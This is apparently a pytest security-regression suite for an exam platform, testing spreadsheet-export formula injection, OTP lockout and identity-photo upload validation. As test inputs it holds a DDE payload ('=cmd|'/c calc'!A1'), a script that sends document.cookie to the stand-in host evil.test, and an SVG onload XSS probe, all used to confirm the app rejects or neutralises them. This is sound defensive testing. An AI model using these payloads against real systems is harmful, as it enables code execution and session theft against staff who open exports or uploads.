"""Findings from a full pre-deploy security pass, each pinned so it cannot silently regress."""

import io
import zipfile

from api.models import Batch, Candidate
from api.services.excel_upload import (
    generate_candidates_workbook, generate_template_workbook,
    generate_validation_report_workbook,
)
from api.services.question_bank import generate_question_template_workbook


def _formula_elements(workbook):
    """The raw <f> elements openpyxl actually wrote into the file - not the in-memory
    Cell.data_type, which a naive check could pass while the file on disk still carries a live
    formula. This inspects the same bytes Excel would open.
    """
    buf = io.BytesIO()
    workbook.save(buf)
    buf.seek(0)
    with zipfile.ZipFile(buf) as archive:
        sheet_names = [n for n in archive.namelist() if n.startswith('xl/worksheets/sheet')]
        xml = ''.join(archive.read(n).decode('utf-8') for n in sheet_names)
    return xml.count('<f>')


class TestSpreadsheetExportsCannotCarryFormulas:
    """A candidate's name, college, or a validation error message is attacker-controlled text
    that reaches an xlsx a staff member opens and trusts. openpyxl writes any string starting
    with "=" as a live formula (verified: '=cmd|\\'/c calc\\'!A1' becomes a real <f> element),
    which is a code-execution primitive against whoever opens the export next.
    """

    DDE_PAYLOAD = "=cmd|'/c calc'!A1"

    def test_a_formula_in_a_candidate_name_does_not_survive_the_export(
        self, ta_user, make_batch, make_candidate
    ):
        candidate = make_candidate(make_batch(ta_user), ta_user, first_name=self.DDE_PAYLOAD)
        wb = generate_candidates_workbook(
            Candidate.objects.filter(pk=candidate.pk),
            latest_attempt_fn=lambda c: None,
        )
        assert _formula_elements(wb) == 0

    def test_a_formula_in_a_validation_error_message_does_not_survive(
        self, ta_user, make_batch, make_candidate
    ):
        candidate = make_candidate(
            make_batch(ta_user, status=Batch.Status.DRAFT), ta_user,
            first_name=self.DDE_PAYLOAD,
            validation_errors=[{'field': 'first_name', 'message': self.DDE_PAYLOAD}],
        )
        wb = generate_validation_report_workbook(Candidate.objects.filter(pk=candidate.pk))
        assert _formula_elements(wb) == 0

    def test_ordinary_data_is_not_corrupted_by_the_fix(self, ta_user, make_batch, make_candidate):
        """The naive CSV-era mitigation - prefixing every cell with an apostrophe - would
        visibly break this: every Indian mobile number in the export starts with '+91', and
        openpyxl already treats a leading '+'/'-'/'@' as plain text on its own.
        """
        candidate = make_candidate(make_batch(ta_user), ta_user, phone='+919876543210')
        wb = generate_candidates_workbook(
            Candidate.objects.filter(pk=candidate.pk),
            latest_attempt_fn=lambda c: None,
        )
        values = [c.value for row in wb.active.iter_rows() for c in row]
        assert '+919876543210' in values

    def test_the_blank_templates_are_hardened_too(self, db):
        """Not attacker-controlled today, but hardening only the paths that currently carry
        untrusted data is exactly the kind of guard that quietly stops working the day a new
        field is added upstream. Cheap to apply everywhere; verified everywhere.
        """
        assert _formula_elements(generate_template_workbook()) == 0
        assert _formula_elements(generate_question_template_workbook()) == 0


class TestOtpCannotBeBruteForced:
    def test_the_lockout_threshold_exists_and_is_enforced_before_hashing(self):
        from api.views.auth import VerifyOtpResetView
        assert VerifyOtpResetView.MAX_ATTEMPTS == 5


class TestIdentityPhotoUploadCannotStoreExecutableContent:
    """POST /api/exam/token/<token>/identity/ is unauthenticated by necessity - a candidate
    hasn't started their exam yet - and gated only by a valid invitation token, which any
    candidate holds for their own link. The declared content type of a multipart upload is
    whatever the CLIENT sends, not a property of the file; unvalidated, it was stored verbatim
    on the blob and served back to staff by the Candidate Details evidence panel, which opens
    the URL directly (target="_blank", no `download` attribute) - so the browser renders
    whatever content type the upload claimed.
    """

    from io import BytesIO

    def _files(self, content_type='image/jpeg', body=b'\xff\xd8\xff\xe0fake-jpeg-bytes'):
        from django.core.files.uploadedfile import SimpleUploadedFile
        return {
            'id_photo': SimpleUploadedFile('id.jpg', body, content_type=content_type),
            'face_photo': SimpleUploadedFile('face.jpg', body, content_type=content_type),
        }

    def _invitation(self, ta_user, make_batch, make_candidate, make_invitation):
        from django.utils import timezone
        from datetime import timedelta
        # Zero questions per section: this suite is exercising upload validation, not question
        # selection, and a real question bank isn't seeded in these tests. select_questions_for_
        # attempt treats a required count of 0 as "nothing to pick" rather than
        # InsufficientQuestionsError, which is what keeps this a validator test and not an
        # end-to-end exam-start test.
        batch = make_batch(ta_user, logical_questions=0, quantitative_questions=0,
                           verbal_questions=0, programming_questions=0)
        candidate = make_candidate(batch, ta_user)
        return make_invitation(
            candidate, ta_user,
            link_expired_at=timezone.now() + timedelta(days=2),
        )

    def test_an_html_upload_claiming_to_be_a_photo_is_rejected(
        self, api_client, ta_user, make_batch, make_candidate, make_invitation, settings
    ):
        settings.AZURE_STORAGE_CONNECTION_STRING = ''
        settings.DEBUG = True  # forces blob_storage's local-disk fallback, never reached anyway
        invitation = self._invitation(ta_user, make_batch, make_candidate, make_invitation)

        payload = self._files(
            content_type='text/html',
            body=b'<script>fetch("https://evil.test/steal?c="+document.cookie)</script>',
        )
        response = api_client.post(
            f'/api/exam/token/{invitation.unique_link_token}/identity/', payload, format='multipart',
        )

        assert response.status_code == 400
        assert 'JPEG or PNG' in response.json()['detail']

    def test_an_svg_upload_is_rejected(
        self, api_client, ta_user, make_batch, make_candidate, make_invitation, settings
    ):
        """SVG is the classic image-upload XSS vector: browsers execute <script> inside an SVG
        opened directly, and it visually still passes as 'an image file' to anyone not
        inspecting the content type.
        """
        settings.AZURE_STORAGE_CONNECTION_STRING = ''
        settings.DEBUG = True
        invitation = self._invitation(ta_user, make_batch, make_candidate, make_invitation)

        payload = self._files(
            content_type='image/svg+xml',
            body=b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>',
        )
        response = api_client.post(
            f'/api/exam/token/{invitation.unique_link_token}/identity/', payload, format='multipart',
        )

        assert response.status_code == 400

    def test_a_genuine_jpeg_upload_still_succeeds(
        self, api_client, ta_user, make_batch, make_candidate, make_invitation, settings
    ):
        """The fix must not break the real flow - the actual frontend always sends image/jpeg
        (webcam/PhotoCapture.jsx: canvas.toBlob(..., 'image/jpeg')).
        """
        settings.AZURE_STORAGE_CONNECTION_STRING = ''
        settings.DEBUG = True
        invitation = self._invitation(ta_user, make_batch, make_candidate, make_invitation)

        response = api_client.post(
            f'/api/exam/token/{invitation.unique_link_token}/identity/',
            self._files(content_type='image/jpeg'), format='multipart',
        )

        assert response.status_code == 200, response.content

    def test_an_oversized_photo_is_rejected(
        self, api_client, ta_user, make_batch, make_candidate, make_invitation, settings
    ):
        settings.AZURE_STORAGE_CONNECTION_STRING = ''
        settings.DEBUG = True
        invitation = self._invitation(ta_user, make_batch, make_candidate, make_invitation)

        from api.services.image_validation import MAX_PHOTO_SIZE_BYTES
        oversized = b'\xff\xd8\xff\xe0' + b'0' * (MAX_PHOTO_SIZE_BYTES + 1)
        response = api_client.post(
            f'/api/exam/token/{invitation.unique_link_token}/identity/',
            self._files(body=oversized), format='multipart',
        )

        assert response.status_code == 400
        assert 'too large' in response.json()['detail']


class TestValidatorUnit:
    """The validator in isolation, independent of the view plumbing above."""

    def test_allowlist_rejects_anything_not_jpeg_or_png(self):
        from api.services.image_validation import ALLOWED_IMAGE_CONTENT_TYPES
        for dangerous in ('text/html', 'image/svg+xml', 'application/javascript',
                          'text/xml', 'application/xhtml+xml'):
            assert dangerous not in ALLOWED_IMAGE_CONTENT_TYPES

    def test_a_content_type_with_parameters_is_still_matched(self):
        """Content-Type headers can carry a charset/boundary suffix - 'image/jpeg;
        charset=binary' is legitimate and must not be rejected as a fabricated mismatch.
        """
        from django.core.files.uploadedfile import SimpleUploadedFile
        from api.services.image_validation import validate_identity_photo
        upload = SimpleUploadedFile('x.jpg', b'data', content_type='image/jpeg; charset=binary')
        validate_identity_photo(upload, 'Photo')  # must not raise
